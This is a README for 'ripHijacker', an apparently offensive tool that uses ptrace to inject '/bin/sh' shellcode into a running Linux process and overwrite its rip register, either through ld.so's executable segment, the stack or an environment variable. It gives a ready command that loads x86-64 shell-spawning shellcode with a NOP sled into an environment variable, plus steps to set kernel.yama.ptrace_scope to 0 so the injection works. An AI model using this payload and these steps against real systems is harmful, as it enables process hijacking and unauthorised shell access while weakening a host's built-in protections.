# ripHijacker
                       
 Usage: ./ripHijacker -p target_pid  [-z 0|1 [-e environment_variable -n target_program_name]]
 
-------------------------------------------------------------------------------------------------------------------------

./ripHijacker -p target_pid

..allows you to inject an hardcoded "/bin/sh" shellcode into the executable segment /lib/x86_64-linux-gnu/ld-2.19.so of the target and to overwrite its rip register with the address of that segment.
-------------------------------------------------------------------------------------------------------------------------

./ripHijacker -p target_pid -z 1

..allows you to inject an hardcoded "/bin/sh" shellcode into the stack of the target and to overwrite its rip register with the address pointed by its rsp register.
-------------------------------------------------------------------------------------------------------------------------

./ripHijacker -p target_pid -z 1 -e environment_variable -n target_program_name 

..allows you to overwrite the register rip of the target with the address of the environment variable (specified with -e option) in the target's stack.
-------------------------------------------------------------------------------------------------------------------------
We can load a simple shellcode in an environment variable with the command:

export A=$(python -c "print '\x90' * 20 + '\xeb\x1f\x5f\x48\x31\xc0\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05\x48\x31\xff\x48\x83\xc0\x7f\x48\x83\xc0\x2d\x0f\x05\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'")

ripHijacker uses ptrace. "A PTRACE scope of "0" is the more permissive mode.  A scope of "1" limits
PTRACE only to direct child processes", so we can change scope of ptrace with these commands:

sudo vim  /etc/sysctl.d/10-ptrace.conf

..and setting.. 

kernel.yama.ptrace_scope = 0

..after that we must load the new settings with:

sudo sysctl --system -a -p | grep  yama

Obviously, to use '-z 1' option the target program must be compiled with the "-z execstack" option and to use -e and -n options the environment variable must be loaded before the program target execution.

Acknowledgment:

  Vorrei ringraziare Fabio Blacklight ed il suo vecchio ma geniale programma meminj.c che mi ha permesso di venire a 
  conoscenza dell'utilità di ptrace ed anche Crossbower che mi ha dato l'idea su come effettuare l'attacco ld_inj




